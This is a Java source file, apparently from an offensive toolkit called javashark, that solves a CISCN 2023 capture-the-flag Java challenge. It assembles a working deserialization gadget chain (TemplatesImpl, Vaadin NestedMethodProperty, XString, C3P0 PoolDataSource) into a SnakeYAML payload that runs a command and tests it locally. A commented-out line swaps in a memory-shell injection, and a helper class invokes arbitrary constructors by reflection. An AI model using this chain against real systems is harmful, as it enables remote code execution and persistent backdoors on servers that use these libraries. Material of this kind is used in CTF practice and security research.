package dev.silente.javashark.solution;

import dev.silente.javashark.gadget.c3p0.GPoolDataSource;
import dev.silente.javashark.gadget.jdk.GXString;
import dev.silente.javashark.gadget.vaadin.GNestedMethodProperty;
import dev.silente.javashark.poc.SnakeYamlWays;
import dev.silente.javashark.sink.jdk.STemplates;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.SerializeUtils;

import java.lang.reflect.Constructor;

/* 华北赛区 Java 题 */
public class CISCN2023 {
    public static void main(String[] args) throws Exception {

        // 1 cmd
        Object exp = STemplates.createTemplatesImpl("calc");

        // 2 memshell
//        Object exp = STemplates.getEvilTemplates(MiscUtils.classAsBytes(Evil.class));

        Object property = GNestedMethodProperty.toString2Getter(exp);
        Object xstring = GXString.deserialize2ToString(property);
        String hexstr = MiscUtils.bytes2HexString(SerializeUtils.serialize(xstring));
        String poc = SnakeYamlWays.C3P0PoolDataSource(hexstr);

        System.out.println(poc);

        // test
        SnakeYamlWays.load(poc);
    }
}



class Myexpect extends Exception {
    private Class[] typeparam;

    private Object[] typearg;

    private Class targetclass;

    public String name;

    public String anyexcept;

    public Class getTargetclass() {
        return this.targetclass;
    }

    public void setTargetclass(Class targetclass) {
        this.targetclass = targetclass;
    }

    public Object[] getTypearg() {
        return this.typearg;
    }

    public void setTypearg(Object[] typearg) {
        this.typearg = typearg;
    }

    public Object getAnyexcept() throws Exception {
        System.out.println("getAnyexcept");
        Constructor con = this.targetclass.getConstructor(this.typeparam);
        return con.newInstance(this.typearg);
    }

    public void setAnyexcept(String anyexcept) {
        this.anyexcept = anyexcept;
    }

    public Class[] getTypeparam() {
        return this.typeparam;
    }

    public void setTypeparam(Class[] typeparam) {
        this.typeparam = typeparam;
    }

    public String getName() {
        return this.name;
    }

    public void setName(String name) {
        this.name = name;
    }
}